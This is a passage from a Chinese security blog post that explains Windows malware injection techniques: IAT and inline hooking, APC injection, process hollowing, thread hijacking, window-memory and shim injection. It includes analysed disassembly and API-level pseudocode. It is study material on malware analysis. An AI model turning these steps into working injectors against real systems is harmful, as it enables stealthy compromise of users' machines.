<h2 id="1-IAT-HOOK技术【复杂且不友好】"><a href="#1-IAT-HOOK技术【复杂且不友好】" class="headerlink" title="1.IAT_HOOK技术【复杂且不友好】"></a>1.IAT_HOOK技术【复杂且不友好】</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在一个windows应用程序中，人们所编写的代码所占的比例不到20%，其他都是导入的是库文件（windows下主要是dll文件），dll文件的存在大大简化了人们的工作，同样的也减少了程序所运行的成本，因为在一个dll文件中不是所有函数都会被使用。在.exe文件中存在一个叫做IAT（导入地址表）的表，这个表存在的原因就是便于程序去dll文件中寻找特定的函数。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一个正常的exe使用IAT的过程如下：程序调用了某个dll中的函数，首先回去程序自带的IAT中寻找改函数在dll中所处的地址，然后调用一个jmp跳转到dll！FUN()所在的地址，继续执行。【windows加载器会在程序运行时把dll中函数的地址存储在IAT中，当然程序第一个调用的是IAT的地址】<br>    <img src="https://i.imgur.com/DKkEngR.png" alt=""><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果程序被IAT_HOOK的话，过程是这样的。首先先使用DLL注入把含有恶意代码的DLL注入到进程内部，并修改IAT数据，程序和正常过程一样调用IAT的地址，但是此时IAT的函数地址并不是正常的函数地址，jmp到恶意的函数中执行，执行完恶意代码后call到正常的dll中。然后retn。<br>    <img src="https://i.imgur.com/fYLAiIV.png" alt=""></p>
<h2 id="2-InLine-HOOK技术"><a href="#2-InLine-HOOK技术" class="headerlink" title="2.InLine_HOOK技术"></a>2.InLine_HOOK技术</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;InLine_HOOK技术和IAT_HOOK技术同样是钩取需要调用的API函数，区别在于InLine_HOOK并不是钩取IAT的数据，而是直接修改API函数内前5个字节，将其修改为<strong>JMP XXXXXXXX(恶意代码地址）</strong>。当然在修改后要恢复修改的内容以便原函数能够正确的执行。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;基本过程如下：正常调用API，在钩取前要修改原函数前5个字节，（1）做一个JMP，跳转到恶意代码，利用寄存器存储恶意代码地址，（2）然后跳转到原函数，还原原函数开始的前五个字节，以便正常执行原函数，（3)利用之前存储的地址，我们call过去，这样就到达了恶意代码处，(4)恶意代码执行完毕，返回正常执行原API函数，(5)最后返回用户领空.<br>    <img src="https://i.imgur.com/r4Disvj.png" alt=""><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下面是一次关于InLine_HOOK的分析案例：</p>
<ul>
<li>在这里，先是利用App_Lnit技术加载了恶意的dll.以便后续的钩取。<br>  <img src="https://i.imgur.com/4ueB0FJ.png" alt=""></li>
<li>然后暂定线程，以便后续修改函数<br>  <img src="https://i.imgur.com/3G4idNi.png" alt=""></li>
<li>程序首先对进程进行快照，在快照列表中寻找符合要求的进程名，如果有则下一步<br>  <img src="https://i.imgur.com/lVkDgtl.png" alt=""></li>
<li>先获取当前的进程ID，然后把wsock32.dll和send函数作为参数压入。<br>  <img src="https://i.imgur.com/dBFrI8b.png" alt=""></li>
<li>如图，a2是钩取函数的地址，a2-ipAddress是为了获得两个进程的相对距离，-5是为了获得jmp xxxxxxxxx的大小，然后调用VirtuaProtect获得进程内存的权限。以便下面的修改，修改之后继续调用VirtaulProtect恢复进程原来状态<br>  <img src="https://i.imgur.com/AdGNXow.png" alt=""></li>
<li>最后恢复执行线程<br>  <img src="https://i.imgur.com/P2sPZU2.png" alt=""></li>
</ul>
<h1 id="第五部分：APC注入"><a href="#第五部分：APC注入" class="headerlink" title="第五部分：APC注入"></a>第五部分：APC注入</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;APC是一个链状的数据结构，可以让一个线程在其本应该的执行步骤前执行其他代码，每个线程都维护这一个APC链，他在线程处于可警告的等待状态时被执行。恶意代码为了使得自己立即被执行，他们会利用APC抢占处于等待状态的线程。</p>
<h2 id="用户模式下的APC注入"><a href="#用户模式下的APC注入" class="headerlink" title="用户模式下的APC注入"></a>用户模式下的APC注入</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;程序利用QueueUserAPC()函数调用远程函数，<strong>该函数的参数为pfnAPC,hThread,dwData,（1）目标线程的句柄; 2）指向恶意软件想要运行的函数指针; 3）和传递给函数指针的参数）。其要求hThread调用数值为dwData的pfnAPC定义的函数。</strong>当然线程处于等待状态是APC注入的前提，一般的注入svchost.exe，我们也可以调用SleepEx，SignalObjectAndWait，MsgWaitForMultipleObjectsEx，WaitForMultipleObjectsEx或WaitForSingleObjectEx函数，线程将进入可警醒状态。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">push</span> [<span class="built_in">esp</span>+dwThreadId]</div><div class="line"><span class="keyword">push</span> <span class="number">0</span></div><div class="line"><span class="keyword">push</span> <span class="number">10h</span></div><div class="line"><span class="keyword">call</span> <span class="built_in">ds</span>:OpenThread</div><div class="line"><span class="keyword">mov</span> <span class="built_in">esi</span>,<span class="built_in">eax</span></div><div class="line"><span class="keyword">test</span> <span class="built_in">esi</span>,<span class="built_in">esi</span></div><div class="line"><span class="keyword">jz</span> short Loc_401DCE</div><div class="line"><span class="keyword">push</span> [<span class="built_in">esp</span>+dwData]    <span class="comment">;dbnet.dll</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">esi</span>             <span class="comment">;hThread</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">ds</span>:LoadLibraryA <span class="comment">;pfnAPC</span></div><div class="line"><span class="keyword">call</span> <span class="built_in">ds</span>:QueueUserAPC</div><div class="line"><span class="comment">;调用QueueUserAPC对pThread进程调用参数为dbnet.dll的LoadLibrary函数</span></div></pre></td></tr></table></figure></p>
<pre><code>![](https://i.imgur.com/Tb9YAz1.png)
</code></pre><h2 id="内核模式下的APC注入"><a href="#内核模式下的APC注入" class="headerlink" title="内核模式下的APC注入"></a>内核模式下的APC注入</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用KeInitializeAPC()和KeInsertQueueAPC()进行APC注入。</p>
<h1 id="第六部分：进程替换技术-进程hollowing"><a href="#第六部分：进程替换技术-进程hollowing" class="headerlink" title="第六部分：进程替换技术(进程hollowing)"></a>第六部分：进程替换技术(进程hollowing)</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;除了注入之外，我们还可以使用进程替换技术将一个可执行文件写入一个运行的进程内部，这种技术让恶意代码拥有和被替换进程相同的特权，<strong>这个技术关键是：需要以挂起状态创建进程，也就是说，这个进程将会被载入内存，但是主线程过去，在外部程序恢复主线程之前，程序不会工作，恢复主线程之后，程序工作。</strong>如下代码是进程替换代码的伪代码.该程序通过调用CreateProcess<strong>并将进程创建标志设置为CREATE_SUSPENDED（0x00000004）完成。新进程的主线程被创建为挂起状态，</strong>直到ResumeThread函数被调用才会运行。接下来，恶意软件需要用恶意的有效载荷来替换合法文件的内容。这可以通过调用ZwUnmapViewOfSection或NtUnmapViewOfSection来取消映射目标进程的内存。这两个API基本上释放了一个部分指向的所有内存。现在内存被取消映射，加载器执行VirtualAllocEx为恶意软件分配新内存，并使用WriteProcessMemory将每个恶意软件的部分写入目标进程空间。恶意软件调用SetThreadContext将entrypoint指向已编写的新代码段。最后，恶意软件通过调用ResumeThread来恢复挂起的线程。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">CreateProcess</span><span class="params">(...,<span class="string">"目标进程.exe"</span>,CREATE_SUSPENDED)</span></span>；<span class="comment">//以挂起状态创建进程</span></div><div class="line"><span class="function"><span class="title">ZwUnmapviewOfSection</span><span class="params">()</span></span>                             <span class="comment">//释放内存，解除内存映射</span></div><div class="line"><span class="function"><span class="title">VirtualAllocEx</span><span class="params">()</span></span>                                   <span class="comment">//为恶意代码分配新空间</span></div><div class="line"><span class="function"><span class="title">writeProcessMenory</span><span class="params">(header)</span></span>                         <span class="comment">//写入数据（文件头）</span></div><div class="line"><span class="function"><span class="title">for</span><span class="params">(i=<span class="number">0</span>;i&lt;NumberOfSection;i++)</span></span></div><div class="line">	WriteProcessMenory(section)                    <span class="comment">//写入节区数据</span></div><div class="line">···</div><div class="line"><span class="function"><span class="title">ResumeThread</span><span class="params">()</span></span>                                     <span class="comment">//重新启动主线程</span></div></pre></td></tr></table></figure></p>
<pre><code>![](https://i.imgur.com/Kv6WZ0V.png)
</code></pre><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;还有一个类似于进程hollowing的技术，叫做线程执行劫持。他针对进程中的现有线程，避免产生其他新的线程，先是查找线程，并且利用openThread打开目标线程，在获取目标线程的句柄后，恶意软件通过调用SuspendThread来将线程置于挂起模式。调用VirtualAllocEx和WriteProcessMemory来分配内存并执行代码注入的操作。然后调用GetThreadContext和GetThreadContext获取并设置线程的上下文，以将EIP寄存器设置到要执行恶意代码的地址，达到重启线程的作用。<br>    <img src="https://i.imgur.com/bTHGlVo.png" alt=""></p>
<h1 id="第七部分：PE注入"><a href="#第七部分：PE注入" class="headerlink" title="第七部分：PE注入"></a>第七部分：PE注入</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个技术类似于代码注入，但是与代码注入有所不同，更加像是把整个pe文件注入到进程，操作方法与进程替换的步骤又有所相像。这里暂时不做理会。</p>
<h1 id="第八部分：通过SETWINDOWLONG-进行窗口内存注入-EWMI"><a href="#第八部分：通过SETWINDOWLONG-进行窗口内存注入-EWMI" class="headerlink" title="第八部分：通过SETWINDOWLONG 进行窗口内存注入 (EWMI)"></a>第八部分：通过SETWINDOWLONG 进行窗口内存注入 (EWMI)</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;EWMI依靠注入资源管理器托盘窗口的额外窗口内存，并在恶意软件家族中被多次使用使用，如Gapz和PowerLoader。在注册窗口类时，应用程序可以指定一些额外的内存字节，称为额外的窗口存储器（EWM）。 然而，EWM并不算是块很充裕的空间。 为了规避这个限制，恶意软件将代码写入explorer.exe的共享部分，并使用SetWindowLong和SendNotifyMessage来指定一个指向shellcode的函数指针，然后执行它。当涉及到向共享部分的写入数据时，恶意软件有两个选择：它可以也创建一个共享空间，并将其映射到自身和另一个进程（例如，explorer.exe）；第二个选择就是简单地打开已经存在的共享部分。 前者具有分配堆空间和调用NTMapViewOfSection以及其他一些API调用的开销，因此后一种方法被更频繁地使用。 恶意软件在共享部分中写入其shellcode后，使用GetWindowLong和SetWindowLong访问并修改“Shell_TrayWnd”的额外窗口内存。 GetWindowLong是用于将指定偏移量的32位值检索到窗口类对象的额外窗口存储器中的API，SetWindowLong用于更改指定偏移量的值。 通过这样做，恶意软件可以简单地更改窗口类中的函数指针的偏移量，并将其指向写入共享部分的shellcode。像上面提到的大多数其他技术一样，恶意软件需要触发它编写的代码。 在以前讨论的技术中，恶意软件通过调用API（如CreateRemoteThread，QueueUserAPC或SetThreadContext）来实现这一点。 在EWMI方法中，恶意软件通过调用SendNotifyMessage触发注入的代码。 在执行SendNotifyMessage之后，Shell_TrayWnd接收并将控件传递给由SetWindowLong先前设置的值指向的地址。 在图13中，名为PowerLoader的恶意软件使用这种技术。 </p>
<h1 id="第九部分：SHIMS注入"><a href="#第九部分：SHIMS注入" class="headerlink" title="第九部分：SHIMS注入"></a>第九部分：SHIMS注入</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft向开发人员提供了Shims[译者注：Shim是一个工程术语，描述为了让两个物体更好地组装在一起而插入的一块木头或金属。在计算机编程中，shim是一个小型的函数库，用于透明地拦截API调用，修改传递的参数、自身处理操作、或把操作重定向到其他地方。Shim也可以用来在不同的软件平台上运行程序。]，主要是为了向后兼容。 Shims允许开发人员将修补程序应用于程序，而无需重写代码。 通过利用Shims，开发人员可以告诉操作系统如何处理其应用程序。 Shims本质上是一种嵌入API并针对特定可执行文件的方式。 恶意软件可以利用Shims来实现注入可执行文件并维持注入。 Windows运行Shim引擎时，它加载二进制文件以检查shimming数据库，以便应用适当的修补程序。有许多可以使用的修复程序，但是恶意软件还是更偏爱那些安全相关的（例如DisableNX，DisableSEH，InjectDLL等）。要安装shimming数据库，恶意软件可以使用各种方法。 例如，一个常见的方法是简单执行sdbinst.exe，并将其指向恶意的sdb文件。 在图14中，广告软件“Search Protect by Conduit”使用Shims进行注入和维持。 它在Google Chrome中执行“InjectDLL”shim以加载vc32loader.dll。 现在有一些用于分析sdb文件的工具，但是对于下面列出的sdb的分析，我使用了python-sdb，而没有使用现成的工具。 </p>
<h1 id="第十部分：说明"><a href="#第十部分：说明" class="headerlink" title="第十部分：说明"></a>第十部分：说明</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这篇博客，我主要参考的是逆向工程核心原理23.27.30-32等章节和恶意代码分析实战，以及来自看雪的一篇文章<a href="https://bbs.pediy.com/thread-220500.htm。文章的主要内容是2-7部分，第8.9两部分是摘录自看雪。先写了关于本文的前7章内容，随后看了看雪的这篇文章，里面介绍的内容和原来和很多相同，所以不做摘录，关于进程替换技术原来使用得是ResumeThread()API调用重启进程，也可以使用SetThreadContext来设置EIP为恶意代码入口。**在线程执行劫持**部分有所体现。关于**AppCertDlls注册表注入部分**。注册表项HKLM\System\CurrentControlSet\Control\Session" target="_blank" rel="external">https://bbs.pediy.com/thread-220500.htm。文章的主要内容是2-7部分，第8.9两部分是摘录自看雪。先写了关于本文的前7章内容，随后看了看雪的这篇文章，里面介绍的内容和原来和很多相同，所以不做摘录，关于进程替换技术原来使用得是ResumeThread()API调用重启进程，也可以使用SetThreadContext来设置EIP为恶意代码入口。**在线程执行劫持**部分有所体现。关于**AppCertDlls注册表注入部分**。注册表项HKLM\System\CurrentControlSet\Control\Session</a> Manager\AppCertDlls可能需要自己写入。因为AppCertDlls并不存在。<br>     <img src="https://i.imgur.com/O1rKkl5.png" alt=""></p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2018/02/02/反向shell技术/" rel="next" title="反向shell">
                <i class="fa fa-chevron-left"></i> 反向shell
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2018/02/10/搭建inetsim虚拟分析网络/" rel="prev" title="搭建inetsim虚拟分析网络">
                搭建inetsim虚拟分析网络 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">findream</p>
              <p class="site-description motion-element" itemprop="description">Apes--change the world's animals</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">36</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                
                  <span class="site-state-item-count">5</span>
                  <span class="site-state-item-name">分类</span>
                
              </div>
            

            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          <div class="links-of-author motion-element">
            
          </div>

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#第一部分：Rootkit技术"><span class="nav-number">1.</span> <span class="nav-text">第一部分：Rootkit技术</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第二部分：DLL注入"><span class="nav-number">2.</span> <span class="nav-text">第二部分：DLL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#DLL注入的第一种方法：CreateRemoteThread远程线程调用"><span class="nav-number">2.1.</span> <span class="nav-text">DLL注入的第一种方法：CreateRemoteThread远程线程调用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DLL注入的第二种方法：利用注册表注入"><span class="nav-number">2.2.</span> <span class="nav-text">DLL注入的第二种方法：利用注册表注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DLL注入的第三种方法：SetWindowsHookEx-设置钩子"><span class="nav-number">2.3.</span> <span class="nav-text">DLL注入的第三种方法：SetWindowsHookEx()设置钩子</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dll注入的第四种方法：dll搜索劫持结束（也称dll加载顺序挟持）-Dll-Search-Order-Hijacking"><span class="nav-number">2.4.</span> <span class="nav-text">Dll注入的第四种方法：dll搜索劫持结束（也称dll加载顺序挟持）[Dll Search Order Hijacking]</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第三部分：代码注入"><span class="nav-number">3.</span> <span class="nav-text">第三部分：代码注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第四部分：HOOK技术"><span class="nav-number">4.</span> <span class="nav-text">第四部分：HOOK技术</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-IAT-HOOK技术【复杂且不友好】"><span class="nav-number">4.1.</span> <span class="nav-text">1.IAT_HOOK技术【复杂且不友好】</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-InLine-HOOK技术"><span class="nav-number">4.2.</span> <span class="nav-text">2.InLine_HOOK技术</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第五部分：APC注入"><span class="nav-number">5.</span> <span class="nav-text">第五部分：APC注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#用户模式下的APC注入"><span class="nav-number">5.1.</span> <span class="nav-text">用户模式下的APC注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#内核模式下的APC注入"><span class="nav-number">5.2.</span> <span class="nav-text">内核模式下的APC注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第六部分：进程替换技术-进程hollowing"><span class="nav-number">6.</span> <span class="nav-text">第六部分：进程替换技术(进程hollowing)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第七部分：PE注入"><span class="nav-number">7.</span> <span class="nav-text">第七部分：PE注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第八部分：通过SETWINDOWLONG-进行窗口内存注入-EWMI"><span class="nav-number">8.</span> <span class="nav-text">第八部分：通过SETWINDOWLONG 进行窗口内存注入 (EWMI)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第九部分：SHIMS注入"><span class="nav-number">9.</span> <span class="nav-text">第九部分：SHIMS注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第十部分：说明"><span class="nav-number">10.</span> <span class="nav-text">第十部分：说明</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">findream</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>

  
  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>



  


  




	





  





  












  





  

  

  
  

  

  

  

</body>
</html>
